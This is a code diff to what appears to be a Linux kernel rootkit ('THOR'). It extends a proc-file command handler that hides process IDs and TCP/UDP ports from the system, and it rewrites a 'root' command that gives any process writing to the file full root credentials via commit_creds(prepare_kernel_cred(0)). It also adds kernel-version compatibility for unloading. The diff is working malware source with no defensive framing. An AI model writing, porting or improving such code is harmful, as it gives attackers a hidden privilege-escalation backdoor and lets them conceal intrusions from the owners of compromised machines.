@@ -6,9 +6,11 @@
 #include "prochider.h"
 #include "sockethider.h"
 
+#include <linux/module.h>
 #include <linux/proc_fs.h>
 #include <linux/ptrace.h>
 #include <linux/seq_file.h>
+#include <linux/version.h>
 
 /* function prototypes */
 static int procfile_read(struct seq_file *m, void *v);
@@ -78,6 +80,7 @@ static int procfile_open(struct inode *inode, struct file *file)
 static ssize_t procfile_write(struct file *file, const char __user *buffer,
         size_t count, loff_t *ppos)
 {
+    int r;
     if (strncmp(buffer, "hp ", MIN(3, count)) == 0) {
         add_to_pid_list(buffer + 3, count - 3);
     } else if (strncmp(buffer, "upa", MIN(3, count)) == 0) {
@@ -95,14 +98,14 @@ static ssize_t procfile_write(struct file *file, const char __user *buffer,
         char s_port[12];
         strncpy(s_port, buffer+5, MIN(12, count - 5));
         s_port[MIN(12, count-5)-1] = 0;
-        kstrtol(s_port, 10, &port);
+        r = kstrtol(s_port, 10, &port);
         add_to_tcp4_list((int)port);
     } else if(strncmp(buffer, "ut4s ", MIN(5, count)) == 0) {
         long port;
         char s_port[12];
         strncpy(s_port, buffer+5, MIN(12, count - 5));
         s_port[MIN(12, count-5)-1] = 0;
-        kstrtol(s_port, 10, &port);
+        r = kstrtol(s_port, 10, &port);
         remove_from_tcp4_list((int)port);
     } else if(strncmp(buffer, "ut4a", MIN(4, count)) == 0) {
         clear_tcp4_list();
@@ -111,14 +114,14 @@ static ssize_t procfile_write(struct file *file, const char __user *buffer,
         char s_port[12];
         strncpy(s_port, buffer+5, MIN(12, count - 5));
         s_port[MIN(12, count-5)-1] = 0;
-        kstrtol(s_port, 10, &port);
+        r = kstrtol(s_port, 10, &port);
         add_to_tcp6_list((int)port);
     } else if(strncmp(buffer, "ut6s ", MIN(5, count)) == 0) {
         long port;
         char s_port[12];
         strncpy(s_port, buffer+5, MIN(12, count - 5));
         s_port[MIN(12, count-5)-1] = 0;
-        kstrtol(s_port, 10, &port);
+        r = kstrtol(s_port, 10, &port);
         remove_from_tcp6_list((int)port);
     } else if(strncmp(buffer, "ut6a", MIN(4, count)) == 0) {
         clear_tcp6_list();
@@ -127,14 +130,14 @@ static ssize_t procfile_write(struct file *file, const char __user *buffer,
         char s_port[12];
         strncpy(s_port, buffer+5, MIN(12, count - 5));
         s_port[MIN(12, count-5)-1] = 0;
-        kstrtol(s_port, 10, &port);
+        r = kstrtol(s_port, 10, &port);
         add_to_udp4_list((int)port);
     } else if(strncmp(buffer, "uu4s ", MIN(5, count)) == 0) {
         long port;
         char s_port[12];
         strncpy(s_port, buffer+5, MIN(12, count - 5));
         s_port[MIN(12, count-5)-1] = 0;
-        kstrtol(s_port, 10, &port);
+        r = kstrtol(s_port, 10, &port);
         remove_from_udp4_list((int)port);
     } else if(strncmp(buffer, "uu4a", MIN(4, count)) == 0) {
         clear_udp4_list();
@@ -143,22 +146,19 @@ static ssize_t procfile_write(struct file *file, const char __user *buffer,
         char s_port[12];
         strncpy(s_port, buffer+5, MIN(12, count - 5));
         s_port[MIN(12, count-5)-1] = 0;
-        kstrtol(s_port, 10, &port);
+        r = kstrtol(s_port, 10, &port);
         add_to_udp6_list((int)port);
     } else if(strncmp(buffer, "uu6s ", MIN(5, count)) == 0) {
         long port;
         char s_port[12];
         strncpy(s_port, buffer+5, MIN(12, count - 5));
         s_port[MIN(12, count-5)-1] = 0;
-        kstrtol(s_port, 10, &port);
+        r = kstrtol(s_port, 10, &port);
         remove_from_udp6_list((int)port);
     } else if(strncmp(buffer, "uu6a", MIN(4, count)) == 0) {
         clear_udp6_list();
     } else if (strncmp(buffer, "root", MIN(4, count)) == 0) {
-        struct cred *credentials = prepare_creds();
-        credentials->uid = credentials->euid = GLOBAL_ROOT_UID;
-        credentials->gid = credentials->egid = GLOBAL_ROOT_GID;
-        commit_creds(credentials);
+        commit_creds(prepare_kernel_cred(0));
     }
     return count;
 }
@@ -166,7 +166,11 @@ static ssize_t procfile_write(struct file *file, const char __user *buffer,
 void procfile_cleanup(void)
 {
     if (procfile != NULL) {
+#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 10, 0)
+        remove_proc_entry(THOR_PROCFILE, procfile->parent);
+#else
         proc_remove(procfile);
+#endif
         procfile = NULL;
     }
 }
